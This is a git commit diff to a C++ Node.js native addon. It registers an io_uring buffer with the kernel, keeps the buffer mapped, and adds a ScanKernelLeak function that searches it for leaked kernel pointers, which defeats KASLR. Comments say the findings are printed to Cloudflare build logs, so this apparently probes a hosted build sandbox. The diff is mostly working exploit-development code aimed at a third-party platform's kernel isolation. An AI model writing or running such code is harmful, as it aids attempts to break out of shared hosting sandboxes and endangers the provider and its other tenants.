10ec006d4b93a179513e2e7cc0abb2d9de1cb08c
Taofik Hidayat <146046695+eviruin@users.noreply.github.com>
2026-05-15 15:53:17 +0700

    Update binding.cpp

--- binding.cpp
+++ binding.cpp
@@ -3,12 +3,17 @@
 #include <linux/io_uring.h>
 #include <sys/syscall.h>
 #include <sys/mman.h>
-#include <sys/uio.h> // <-- Tambahin ini biar iovec nggak error
+#include <sys/uio.h>
 #include <unistd.h>
 #include <string.h>
-#include <vector>
+#include <stdint.h>
+#include <string>
 
 using namespace v8;
+
+// Global pointers for persistence memory
+void* global_buffer_ptr = nullptr;
+size_t global_buffer_size = 1024 * 1024; // 1MB
 
 void TestMemoryMapping(const FunctionCallbackInfo<Value>& args) {
     Isolate* isolate = args.GetIsolate();
@@ -25,37 +30,64 @@ void TestMemoryMapping(const FunctionCallbackInfo<Value>& args) {
         return;
     }
 
-    // Alokasi buffer 1MB
-    size_t buf_size = 1024 * 1024;
-    void* buffer = mmap(NULL, buf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    // 1MB buffer allocation - We'll leave it mapped in memory
+    if (global_buffer_ptr == nullptr) {
+        global_buffer_ptr = mmap(NULL, global_buffer_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    }
     
-    if (buffer == MAP_FAILED) {
+    if (global_buffer_ptr == MAP_FAILED) {
         log = "[-] mmap failed\n";
+        global_buffer_ptr = nullptr;
     } else {
-        memset(buffer, 0x41, buf_size);
+        // Initial with null 0
+        memset(global_buffer_ptr, 0, global_buffer_size);
 
         struct iovec iov;
-        iov.iov_base = buffer;
-        iov.iov_len = buf_size;
+        iov.iov_base = global_buffer_ptr;
+        iov.iov_len = global_buffer_size;
 
-        // Register buffer ke kernel
+        // Regist buffer to kernel
         int reg_res = syscall(__NR_io_uring_register, ring_fd, IORING_REGISTER_BUFFERS, &iov, 1);
         
         if (reg_res < 0) {
             log += "[-] IORING_REGISTER_BUFFERS failed. Errno: " + std::to_string(errno) + "\n";
-            if (errno == 1) log += "[!] EPERM: Kernel memblokir registrasi buffer (Expected in some hardened jails).\n";
+            if (errno == 1) log += "[!] EPERM: Lockdown aktif.\n";
         } else {
-            log += "[+] SUCCESS: 1MB Buffer registered in kernel space! This is huge.\n";
+            log += "[+] SUCCESS: 1MB Buffer registered and persistent for scanning.\n";
         }
-        munmap(buffer, buf_size);
     }
 
     close(ring_fd);
     args.GetReturnValue().Set(String::NewFromUtf8(isolate, log.c_str()).ToLocalChecked());
 }
 
+void ScanKernelLeak(const FunctionCallbackInfo<Value>& args) {
+    Isolate* isolate = args.GetIsolate();
+    
+    if (!global_buffer_ptr) {
+        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Buffer not initialized").ToLocalChecked());
+        return;
+    }
+
+    uint64_t* scan_ptr = (uint64_t*)global_buffer_ptr;
+    uint32_t found_count = 0;
+
+    // Scanning 8 byte for searching kernel space addrs
+    for (size_t i = 0; i < global_buffer_size / 8; i++) {
+        // pattern KASLR x86_64: 0xffffffffXXXXXXXX
+        if ((scan_ptr[i] >> 32) == 0xffffffff) {
+            // print stdout to build logs Cloudflare
+            printf("[!!!] KERNEL POINTER LEAK FOUND at index %zu: 0x%lx\n", i, (unsigned long)scan_ptr[i]);
+            found_count++;
+        }
+    }
+
+    args.GetReturnValue().Set(Integer::New(isolate, found_count));
+}
+
 void Init(Local<Object> exports) {
     NODE_SET_METHOD(exports, "testMemory", TestMemoryMapping);
+    NODE_SET_METHOD(exports, "scanKernelLeak", ScanKernelLeak);
 }
 
 NODE_MODULE(NODE_GYP_MODULE_NAME, Init)
